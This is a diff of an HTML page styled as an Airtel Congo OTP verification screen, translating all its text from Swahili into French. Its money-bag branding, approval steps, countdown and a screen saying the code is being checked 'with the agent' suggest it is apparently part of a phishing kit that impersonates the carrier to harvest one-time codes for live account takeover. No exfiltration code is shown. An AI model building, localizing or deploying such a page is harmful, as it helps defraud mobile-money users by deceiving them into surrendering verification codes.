@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="sw">
+<html lang="fr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Uthibitishaji wa OTP - Airtel Congo</title>
+    <title>Vérification OTP - Airtel Congo</title>
     <link rel="stylesheet" href="style.css">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -16,7 +16,7 @@
             <div class="logo-small">💰 Airtel Congo</div>
             <div class="security-indicator">
                 <span class="lock-icon">🔒</span>
-                <span>Uthibitishaji wa OTP</span>
+                <span>Vérification OTP</span>
             </div>
         </div>
 
@@ -25,17 +25,17 @@
             <div class="progress-steps">
                 <div class="step-item completed">
                     <div class="step-circle">✓</div>
-                    <span>Maelezo Binafsi</span>
+                    <span>Informations Personnelles</span>
                 </div>
                 <div class="step-line completed"></div>
                 <div class="step-item completed">
                     <div class="step-circle">✓</div>
-                    <span>Uthibitishaji</span>
+                    <span>Vérification</span>
                 </div>
                 <div class="step-line active"></div>
                 <div class="step-item active">
                     <div class="step-circle">3</div>
-                    <span>Idhini</span>
+                    <span>Approbation</span>
                 </div>
             </div>
         </div>
@@ -44,8 +44,8 @@
         <div id="otpScreen" class="form-card">
             <div class="otp-header">
                 <div class="otp-icon">📱</div>
-                <h1 class="form-title">Weka Msimbo wa Uthibitishaji</h1>
-                <p class="form-subtitle">Tumetuma msimbo wa nambari 4 kwa <strong id="maskedPhone">****</strong></p>
+                <h1 class="form-title">Entrez le Code de Vérification</h1>
+                <p class="form-subtitle">Nous avons envoyé un code à 4 chiffres à <strong id="maskedPhone">****</strong></p>
             </div>
 
             <div class="countdown-box">
@@ -56,10 +56,10 @@
                     </svg>
                     <div class="countdown-text">
                         <span class="countdown-number" id="countdown">60</span>
-                        <span class="countdown-label">sekunde</span>
+                        <span class="countdown-label">secondes</span>
                     </div>
                 </div>
-                <p class="countdown-message">Msimbo unaisha baada ya <strong id="timeRemaining">1:00</strong> dakika</p>
+                <p class="countdown-message">Le code expire dans <strong id="timeRemaining">1:00</strong> minute(s)</p>
             </div>
 
             <div class="otp-inputs">
@@ -70,20 +70,20 @@
             </div>
 
             <button id="verifyOtpBtn" class="submit-button">
-                Thibitisha Msimbo
+                Vérifier le Code
                 <span class="arrow">→</span>
             </button>
 
             <div class="resend-section">
-                <p class="resend-text">Hukupokea msimbo?</p>
+                <p class="resend-text">Vous n'avez pas reçu le code ?</p>
                 <button class="link-button" id="resendBtn" disabled>
-                    Tuma Msimbo Tena <span id="resendTimer">(1:00)</span>
+                    Renvoyer le Code <span id="resendTimer">(1:00)</span>
                 </button>
             </div>
 
             <div class="info-box">
-                <p><strong>Kwa nini tunahitaji hii?</strong></p>
-                <p>Uthibitishaji wa OTP unahakikisha kuwa una ufikiaji wa nambari ya simu uliyotoa na husaidia kuzuia ulaghai.</p>
+                <p><strong>Pourquoi avons-nous besoin de cela ?</strong></p>
+                <p>La vérification OTP confirme que vous avez accès au numéro de téléphone fourni et aide à prévenir la fraude.</p>
             </div>
         </div>
 
@@ -91,12 +91,12 @@
         <div id="processingOtpScreen" class="form-card" style="display: none;">
             <div class="processing-content">
                 <div class="spinner-large"></div>
-                <h2 class="processing-title">Tunathibitisha Msimbo Wako</h2>
-                <p class="processing-text">Tafadhali subiri wakati tunathibitisha OTP yako...</p>
+                <h2 class="processing-title">Nous Vérifions Votre Code</h2>
+                <p class="processing-text">Veuillez patienter pendant que nous vérifions votre OTP...</p>
                 
                 <div class="status-box">
                     <span class="status-dot"></span>
-                    <span>Tunakagua na msimamizi...</span>
+                    <span>Vérification auprès de l'agent...</span>
                 </div>
             </div>
         </div>
@@ -105,10 +105,10 @@
         <div id="expiredScreen" class="form-card" style="display: none;">
             <div class="result-content">
                 <div class="result-icon warning">⏰</div>
-                <h2 class="result-title">Msimbo Umeisha Muda</h2>
-                <p class="result-text">Msimbo wako wa uthibitishaji umeisha muda kwa sababu za usalama.</p>
+                <h2 class="result-title">Code Expiré</h2>
+                <p class="result-text">Votre code de vérification a expiré pour des raisons de sécurité.</p>
                 <button class="submit-button" onclick="requestNewCode()">
-                    Omba Msimbo Mpya
+                    Demander un Nouveau Code
                 </button>
             </div>
         </div>
@@ -117,10 +117,10 @@
         <div id="rejectionScreen" class="form-card" style="display: none;">
             <div class="result-content">
                 <div class="result-icon error">✕</div>
-                <h2 class="result-title">Msimbo Usio Sahihi</h2>
-                <p class="result-text">Msimbo wa uthibitishaji ulioweka sio sahihi.</p>
+                <h2 class="result-title">Code Incorrect</h2>
+                <p class="result-text">Le code de vérification que vous avez saisi est incorrect.</p>
                 <button class="submit-button" onclick="location.reload()">
-                    Jaribu Tena
+                    Réessayer
                 </button>
             </div>
         </div>
